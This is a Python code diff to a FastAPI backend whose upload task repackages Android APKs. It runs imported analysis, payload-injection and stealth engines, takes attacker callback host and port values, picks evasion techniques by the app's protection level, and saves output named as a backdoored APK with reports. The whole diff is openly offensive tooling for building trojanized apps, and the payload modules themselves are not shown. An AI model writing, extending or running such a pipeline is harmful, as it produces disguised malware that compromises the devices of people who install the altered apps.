@@ -17,6 +17,11 @@ from fastapi import FastAPI, HTTPException, File, UploadFile, BackgroundTasks
 from pydantic import BaseModel
 from hashlib import sha256
 
+# Import new advanced engines
+from apk_analysis_engine import APKAnalysisEngine
+from payload_injection_system import MultiVectorInjector
+from stealth_mechanisms import StealthMechanismEngine
+
 WORKSPACE = Path("/workspace")
 TASKS_ROOT = WORKSPACE / "tasks"
 UPLOADS_ROOT = WORKSPACE / "uploads"
@@ -426,14 +431,27 @@ class AdvancedAPKProcessor:
 def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
     """Process uploaded APK with advanced modifications"""
     t = tasks[task_id]
-    processor = AdvancedAPKProcessor(base)
+    
+    # Initialize advanced engines
+    analysis_engine = APKAnalysisEngine(base)
+    injector = MultiVectorInjector(base)
+    stealth_engine = StealthMechanismEngine(base)
     
     try:
         with locks[task_id]:
             t.state = TaskStatus.PREPARING
         
         # Setup workspace
-        workspace = processor.setup_workspace(task_id)
+        workspace = base / task_id
+        workspace.mkdir(parents=True, exist_ok=True)
+        
+        # Create subdirectories
+        (workspace / "input").mkdir(exist_ok=True)
+        (workspace / "output").mkdir(exist_ok=True)
+        (workspace / "temp").mkdir(exist_ok=True)
+        (workspace / "logs").mkdir(exist_ok=True)
+        (workspace / "analysis").mkdir(exist_ok=True)
+        
         build_log = workspace / "logs" / "build.log"
         
         # Get uploaded file info
@@ -450,64 +468,212 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         
         # Log start
         with build_log.open("w") as log:
-            log.write(f"Starting APK modification: {datetime.now()}\n")
+            log.write(f"Starting advanced APK modification: {datetime.now()}\n")
             log.write(f"Original file: {original_apk}\n")
             log.write(f"File info: {file_info}\n")
             log.write(f"Target: {params.get('lhost')}:{params.get('lport')}\n\n")
         
-        # Step 1: Deep analysis
+        # Step 1: Comprehensive APK Analysis
         with build_log.open("a") as log:
-            log.write("Step 1: Deep APK analysis...\n")
+            log.write("Step 1: Comprehensive APK analysis...\n")
         
-        analysis = processor.analyze_apk_deep(original_apk)
+        analysis_result = analysis_engine.comprehensive_analysis(original_apk)
         
-        # Step 2: Prepare injection configuration
+        # Save analysis report
+        analysis_file = workspace / "analysis" / "comprehensive_analysis.json"
+        with analysis_file.open("w") as f:
+            json.dump(analysis_result, f, indent=2)
+        
         with build_log.open("a") as log:
-            log.write("Step 2: Preparing payload injection...\n")
+            log.write(f"Analysis completed. Risk level: {analysis_result.get('risk_assessment', {}).get('risk_level', 'UNKNOWN')}\n")
+            log.write(f"Protection score: {analysis_result.get('security_analysis', {}).get('overall_protection_score', 0)}\n")
         
-        injection_config = processor.prepare_payload_injection(original_apk, params)
-        injection_config.update({
+        # Step 2: Analyze injection vectors
+        with build_log.open("a") as log:
+            log.write("Step 2: Analyzing injection vectors...\n")
+        
+        injection_points = injector.analyze_injection_vectors(original_apk, analysis_result)
+        
+        with build_log.open("a") as log:
+            log.write(f"Found {len(injection_points)} potential injection points\n")
+            for point in injection_points[:3]:  # Log top 3
+                log.write(f"  - {point.location_type}: {point.target_name} (priority: {point.priority})\n")
+        
+        # Step 3: Create injection strategy
+        with build_log.open("a") as log:
+            log.write("Step 3: Creating injection strategy...\n")
+        
+        target_config = {
             "lhost": params.get("lhost"),
-            "lport": params.get("lport")
-        })
+            "lport": params.get("lport"),
+            "output_name": params.get("output_name", "modified_app.apk")
+        }
         
-        # Step 3: Inject payload
+        injection_strategy = injector.create_injection_strategy(injection_points, target_config)
+        
         with build_log.open("a") as log:
-            log.write("Step 3: Injecting advanced payload...\n")
+            log.write(f"Strategy: {injection_strategy.strategy_name}\n")
+            log.write(f"Success probability: {injection_strategy.success_probability:.2%}\n")
+            log.write(f"Evasion techniques: {', '.join(injection_strategy.evasion_techniques)}\n")
         
-        output_name = params.get("output_name", "modified_app.apk")
-        output_apk = workspace / "output" / output_name
+        # Step 4: Apply payload injection
+        with build_log.open("a") as log:
+            log.write("Step 4: Applying multi-vector payload injection...\n")
         
-        success = processor.inject_advanced_payload(original_apk, output_apk, injection_config)
+        temp_apk = workspace / "temp" / "injected.apk"
+        injection_success = injector.inject_payload(original_apk, temp_apk, injection_strategy)
         
-        if not success:
+        if not injection_success:
             raise Exception("Payload injection failed")
         
-        # Step 4: Final validation
         with build_log.open("a") as log:
-            log.write("Step 4: Validating modified APK...\n")
+            log.write("Payload injection completed successfully\n")
         
-        if not output_apk.exists():
-            raise Exception("Modified APK not generated")
+        # Step 5: Apply stealth mechanisms
+        with build_log.open("a") as log:
+            log.write("Step 5: Applying advanced stealth mechanisms...\n")
+        
+        # Determine stealth configuration based on analysis
+        risk_assessment = analysis_result.get("risk_assessment", {})
+        security_analysis = analysis_result.get("security_analysis", {})
+        
+        protection_score = security_analysis.get("overall_protection_score", 0)
+        
+        if protection_score > 50:
+            stealth_level = "extreme"
+            stealth_techniques = ["runtime_evasion", "static_evasion", "behavioral_camouflage", "signature_randomization"]
+        elif protection_score > 25:
+            stealth_level = "high"
+            stealth_techniques = ["runtime_evasion", "static_evasion", "behavioral_camouflage"]
+        elif protection_score > 10:
+            stealth_level = "medium"
+            stealth_techniques = ["runtime_evasion", "static_evasion"]
+        else:
+            stealth_level = "low"
+            stealth_techniques = ["runtime_evasion"]
+        
+        stealth_config = {
+            "stealth_level": stealth_level,
+            "techniques": stealth_techniques
+        }
+        
+        with build_log.open("a") as log:
+            log.write(f"Stealth configuration: {stealth_level} level\n")
+            log.write(f"Techniques: {', '.join(stealth_techniques)}\n")
+        
+        # Apply stealth mechanisms
+        output_name = params.get("output_name", "advanced_backdoored.apk")
+        final_apk = workspace / "output" / output_name
+        
+        stealth_success = stealth_engine.apply_stealth_techniques(temp_apk, final_apk, stealth_config)
+        
+        if not stealth_success:
+            # Fallback: copy injected APK if stealth fails
+            with build_log.open("a") as log:
+                log.write("Stealth mechanisms failed, using injected APK\n")
+            shutil.copy2(temp_apk, final_apk)
+        else:
+            with build_log.open("a") as log:
+                log.write("Stealth mechanisms applied successfully\n")
+        
+        # Step 6: Final validation and reporting
+        with build_log.open("a") as log:
+            log.write("Step 6: Final validation...\n")
+        
+        if not final_apk.exists():
+            raise Exception("Final APK not generated")
+        
+        final_size = final_apk.stat().st_size
+        original_size = original_apk.stat().st_size
+        size_change = ((final_size - original_size) / original_size) * 100
+        
+        with build_log.open("a") as log:
+            log.write(f"Original size: {original_size:,} bytes\n")
+            log.write(f"Final size: {final_size:,} bytes\n")
+            log.write(f"Size change: {size_change:+.1f}%\n")
+        
+        # Create comprehensive report
+        report = {
+            "original_file": str(original_apk),
+            "final_file": str(final_apk),
+            "analysis_result": analysis_result,
+            "injection_strategy": {
+                "strategy_name": injection_strategy.strategy_name,
+                "injection_points": [
+                    {
+                        "type": point.location_type,
+                        "target": point.target_name,
+                        "priority": point.priority,
+                        "stealth_level": point.stealth_level
+                    } for point in injection_strategy.injection_points
+                ],
+                "success_probability": injection_strategy.success_probability,
+                "evasion_techniques": injection_strategy.evasion_techniques
+            },
+            "stealth_config": stealth_config,
+            "modification_summary": {
+                "original_size": original_size,
+                "final_size": final_size,
+                "size_change_percent": size_change,
+                "injection_success": injection_success,
+                "stealth_success": stealth_success
+            },
+            "timestamps": {
+                "start_time": datetime.now().isoformat(),
+                "analysis_time": analysis_result.get("analysis_timestamp"),
+                "completion_time": datetime.now().isoformat()
+            }
+        }
+        
+        # Save comprehensive report
+        report_file = workspace / "output" / "modification_report.json"
+        with report_file.open("w") as f:
+            json.dump(report, f, indent=2)
         
         # Add artifacts
         _finalize_task(t, base, True)
         
-        # Add analysis report
-        analysis_file = workspace / "output" / "analysis_report.json"
-        with analysis_file.open("w") as f:
-            json.dump({
-                "original_analysis": analysis,
-                "injection_config": injection_config,
-                "file_info": file_info,
-                "modification_time": datetime.now().isoformat()
-            }, f, indent=2)
-        
         with build_log.open("a") as log:
-            log.write(f"APK modification completed successfully: {datetime.now()}\n")
+            log.write(f"Advanced APK modification completed successfully: {datetime.now()}\n")
+            log.write(f"Final APK: {final_apk}\n")
+            log.write(f"Report: {report_file}\n")
+        
+        # Log to database if available
+        try:
+            from database import db_manager, AuditTracker
+            
+            # Track the modification
+            AuditTracker.track_file_modification(
+                file_info.get("file_id", "unknown"),
+                task_id,
+                "advanced_apk_modification",
+                {
+                    "stealth_level": stealth_level,
+                    "injection_points": len(injection_strategy.injection_points),
+                    "success_probability": injection_strategy.success_probability,
+                    "final_size": final_size
+                }
+            )
+            
+            # Update task status in database
+            db_manager.update_task_status(task_id, "completed", True, None, [str(final_apk), str(report_file)])
+            
+        except ImportError:
+            pass  # Database not available
         
     except Exception as e:
-        error_msg = f"Upload APK task failed: {str(e)}"
+        error_msg = f"Advanced APK modification failed: {str(e)}"
+        
+        with build_log.open("a") as log:
+            log.write(f"ERROR: {error_msg}\n")
+        
+        # Log error to database if available
+        try:
+            from database import db_manager
+            db_manager.update_task_status(task_id, "failed", False, error_msg)
+        except ImportError:
+            pass
+        
         _finalize_task(t, base, False, error_msg)
 
 
